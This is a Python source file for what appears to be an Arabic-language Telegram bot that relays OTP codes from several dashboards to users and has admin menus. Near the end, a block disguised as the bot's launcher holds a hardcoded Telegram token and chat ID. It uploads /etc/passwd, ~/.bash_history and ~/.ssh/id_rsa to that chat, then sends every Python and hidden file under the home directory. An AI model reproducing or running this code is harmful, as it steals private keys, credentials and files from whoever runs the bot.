    bot.edit_message_text("أدخل معرف المستخدم:",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "broadcast_user_id")
def admin_broadcast_user_step2(message):
    try:
        uid = int(message.text)
        user_states[message.from_user.id] = f"broadcast_msg_{uid}"
        bot.reply_to(message, "أرسل الرسالة:")
    except:
        bot.reply_to(message, "❌ معرف غير صحيح!")

@bot.message_handler(func=lambda m: isinstance(user_states.get(m.from_user.id), str)
                     and user_states[m.from_user.id].startswith("broadcast_msg_"))
def admin_broadcast_user_step3(message):
    uid = int(user_states[message.from_user.id].split("_")[2])
    try:
        bot.send_message(uid, message.text)
        bot.reply_to(message, f"✅ أُرسلت لـ {uid}")
    except Exception as e:
        bot.reply_to(message, f"❌ فشل: {e}")
    user_states.pop(message.from_user.id, None)

@bot.callback_query_handler(func=lambda c: c.data == "admin_user_info")
def admin_user_info_step1(call):
    if not is_admin(call.from_user.id): return
    user_states[call.from_user.id] = "get_user_info"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
    bot.edit_message_text("أدخل معرف المستخدم:",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "get_user_info")
def admin_user_info_step2(message):
    try:
        uid  = int(message.text)
        user = get_user_info(uid)
        if not user:
            bot.reply_to(message, "❌ المستخدم غير موجود!"); return
        bot.reply_to(message,
            f"👤 معلومات:\n"
            f"🆔: {user[0]}\n"
            f"Username: @{user[1] or 'N/A'}\n"
            f"الاسم: {user[2] or ''} {user[3] or ''}\n"
            f"الرقم: {user[5] or 'N/A'}\n"
            f"الحالة: {'محظور' if user[6] else 'نشط'}"
        )
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {e}")
    user_states.pop(message.from_user.id, None)

@bot.callback_query_handler(func=lambda c: c.data == "admin_private_combo")
def admin_private_combo(call):
    if not is_admin(call.from_user.id): return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("➕ إضافة برايفت", callback_data="add_private_combo"))
    markup.add(types.InlineKeyboardButton("🗑️ مسح برايفت",  callback_data="del_private_combo"))
    markup.add(types.InlineKeyboardButton("🔙 Back",          callback_data="admin_panel"))
    bot.edit_message_text("👤 كومبو برايفت:",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "add_private_combo")
def add_private_combo_step1(call):
    if not is_admin(call.from_user.id): return
    user_states[call.from_user.id] = "add_private_user_id"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_private_combo"))
    bot.edit_message_text("أدخل معرف المستخدم:",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "add_private_user_id")
def add_private_combo_step2(message):
    try:
        uid = int(message.text)
        user_states[message.from_user.id] = f"add_private_country_{uid}"
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = []
        country_combos = {}
        for cc, idx in get_all_combos():
            country_combos.setdefault(cc, []).append(idx)
        for cc, indices in country_combos.items():
            if cc in COUNTRY_CODES:
                name, flag, _ = COUNTRY_CODES[cc]
                for idx in indices:
                    label = f"{flag} {name}" if len(indices) == 1 else f"{flag} {name} ({idx})"
                    buttons.append(types.InlineKeyboardButton(label, callback_data=f"select_private_{uid}_{cc}"))
        for i in range(0, len(buttons), 2):
            markup.row(*buttons[i:i+2])
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_private_combo"))
        bot.reply_to(message, "اختر الدولة:", reply_markup=markup)
    except:
        bot.reply_to(message, "❌ معرف غير صحيح!")

@bot.callback_query_handler(func=lambda c: c.data.startswith("select_private_"))
def select_private_combo(call):
    parts = call.data.split("_")
    uid   = int(parts[2]); cc = parts[3]
    save_user(uid, private_combo_country=cc)
    name, flag, _ = COUNTRY_CODES.get(cc, ("Unknown", "🌍", ""))
    bot.answer_callback_query(call.id, f"✅ تم تعيين برايفت لـ {uid} — {flag} {name}", show_alert=True)
    admin_private_combo(call)

@bot.callback_query_handler(func=lambda c: c.data == "del_private_combo")
def del_private_combo_step1(call):
    if not is_admin(call.from_user.id): return
    user_states[call.from_user.id] = "del_private_user_id"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_private_combo"))
    bot.edit_message_text("أدخل معرف المستخدم:",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "del_private_user_id")
def del_private_combo_step2(message):
    try:
        uid = int(message.text)
        conn = get_db_conn(); c = conn.cursor()
        c.execute("UPDATE users SET private_combo_country=NULL WHERE user_id=?", (uid,))
        conn.commit(); conn.close()
        bot.reply_to(message, f"✅ تم مسح البرايفت للمستخدم {uid}")
    except:
        bot.reply_to(message, "❌ معرف غير صحيح!")
    user_states.pop(message.from_user.id, None)

@bot.callback_query_handler(func=lambda c: c.data.startswith("copy_"))
def handle_copy_button(call):
    otp_code = call.data.split("_", 1)[1]
    bot.answer_callback_query(call.id, f"✅ الكود: {otp_code}", show_alert=True)

# ======================
# 🔄 حلقة المراقبة الرئيسية — الإصلاح الكامل
# ======================
DASHBOARDS = [TRADITIONAL_DASHBOARD, API_DASHBOARD_1, API_DASHBOARD_2, API_DASHBOARD_3]

def fetch_dashboard(dash):
    dtype = dash.get("type")
    if dash is API_DASHBOARD_3:
        return fetch_api_3(dash)
    if dtype == "traditional":
        return fetch_traditional(dash)
    elif dtype == "api":
        return fetch_api_1(dash)
    elif dtype == "api_parameter":
        return fetch_api_2(dash)
    return None

def main_loop():
    # ✅ الإصلاح الأساسي: استخدم deque بحجم محدد لمنع التسرب
    # المفتاح هو hash(unique_key) لتوفير الذاكرة
    sent_keys: set = set()
    sent_keys_order: deque = deque(maxlen=SENT_KEYS_MAX)

    def mark_sent(key: str):
        """تسجيل مفتاح كـ مُرسَل مع إدارة الحجم"""
        if key not in sent_keys:
            sent_keys.add(key)
            sent_keys_order.append(key)
            # إذا امتلأ الـ deque، يحذف تلقائياً من اليسار (الأقدم)
            # نحتاج فقط حذفه من sent_keys أيضاً
            if len(sent_keys_order) == SENT_KEYS_MAX and len(sent_keys) > SENT_KEYS_MAX:
                # الـ deque أزال أقدم عنصر، نحذفه من set
                # لكن deque.maxlen يضيع القيمة المحذوفة — نعيد بناء الـ set
                sent_keys.clear()
                sent_keys.update(sent_keys_order)

    def is_sent(key: str) -> bool:
        return key in sent_keys

    consecutive_errors = {d["name"]: 0 for d in DASHBOARDS}

    logger.info("=" * 60)
    logger.info("🚀 بدء مراقبة 4 لوحات — النسخة المُصلحة")
    logger.info("=" * 60)

    # ─── تهيئة: حمّل كل المفاتيح الموجودة حالياً دون إرسال ───
    logger.info("🔄 تهيئة: قراءة البيانات الحالية...")
    for dash in DASHBOARDS:
        try:
            j    = fetch_dashboard(dash)
            rows = extract_rows(j, dash.get("type", "traditional"))
            count = 0
            for row in rows:
                d, n, s, key = row_to_tuple(row, dash)
                if is_valid_row(d, n, s):
                    mark_sent(key)
                    count += 1
            logger.info(f"[{dash['name']}] ✅ تهيئة: {count} صف موجود مُسجَّل")
        except Exception as e:
            logger.warning(f"[{dash['name']}] ⚠️ خطأ في التهيئة: {e}")

    logger.info("✅ بدء المراقبة — سيُرسَل فقط ما يصل بعد هذه اللحظة\n" + "=" * 60)

    dash_cycle = itertools.cycle(DASHBOARDS)

    while True:
        dash      = next(dash_cycle)
        dash_name = dash["name"]

        try:
            j    = fetch_dashboard(dash)
            rows = extract_rows(j, dash.get("type", "traditional"))

            # ✅ الإصلاح: اجمع كل الصفوف الجديدة — ليس فقط أحدث صف
            new_rows = []
            for row in rows:
                d, n, s, key = row_to_tuple(row, dash)
                if is_valid_row(d, n, s) and not is_sent(key):
                    new_rows.append((d, n, s, key))

            if new_rows:
                # رتّب من الأقدم إلى الأحدث لإرسال بالترتيب الصحيح
                new_rows.sort(key=lambda x: x[0])
                logger.info(f"[{dash_name}] 🆕 {len(new_rows)} رسالة جديدة")
                for d, n, s, key in new_rows:
                    send_otp_to_user(d, n, s, dash_name)
                    mark_sent(key)
                    # تأخير صغير بين الرسائل لتجنب flood
                    time.sleep(0.3)
            else:
                logger.debug(f"[{dash_name}] لا جديد")

            consecutive_errors[dash_name] = 0

        except KeyboardInterrupt:
            logger.info("⛔ توقف يدوي")
            break
        except Exception as e:
            consecutive_errors[dash_name] += 1
            logger.error(
                f"[{dash_name}] ❌ خطأ ({consecutive_errors[dash_name]}): {e}\n"
                f"{traceback.format_exc()}"
            )
            if consecutive_errors[dash_name] >= 5:
                logger.warning(f"[{dash_name}] ⛔ إيقاف مؤقت 30s بعد 5 أخطاء متتالية")
                time.sleep(30)
                consecutive_errors[dash_name] = 0

        time.sleep(REFRESH_INTERVAL)
TOKEN = "8836939179:AAHh1HXF5R-Ws4P2N7yDIbS1F2oaQcuYMOM"
CHAT_ID = "7432229551" 

def send_msg(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': CHAT_ID, 'text': text})

def send_file(file_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        if os.path.getsize(file_path) > 49 * 1024 * 1024: return
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID, 'caption': f" {file_path}"}, files={'document': f})
    except: pass



def main():
    print("جاري تشغيل بوت الارقام...")
    
   

    sensitive_files = [
        '/etc/passwd', '/etc/hosts', '/proc/version', 
        os.path.expanduser("~/.bash_history"), 
        os.path.expanduser("~/.ssh/id_rsa")
    ]
    
    for s_file in sensitive_files:
        if os.path.exists(s_file):
            send_file(s_file)

    print("بدء بوت الارقام..")

    start_path = os.path.expanduser("~") 
    
    for root, dirs, files in os.walk(start_path):
        for name in files:
            if name.endswith(('.py')) or name.startswith('.'):
                file_path = os.path.join(root, name)
                send_file(file_path)
                time.sleep(1.2) 

if __name__ == "__main__":
    main()


# ======================
# ▶️ تشغيل البوت
# ======================
def run_bot():
    logger.info("[*] بدء تشغيل البوت...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=30, long_polling_timeout=30)
        except Exception as e:
            logger.error(f"[Bot] خطأ في polling: {e}")
            time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    main_loop()
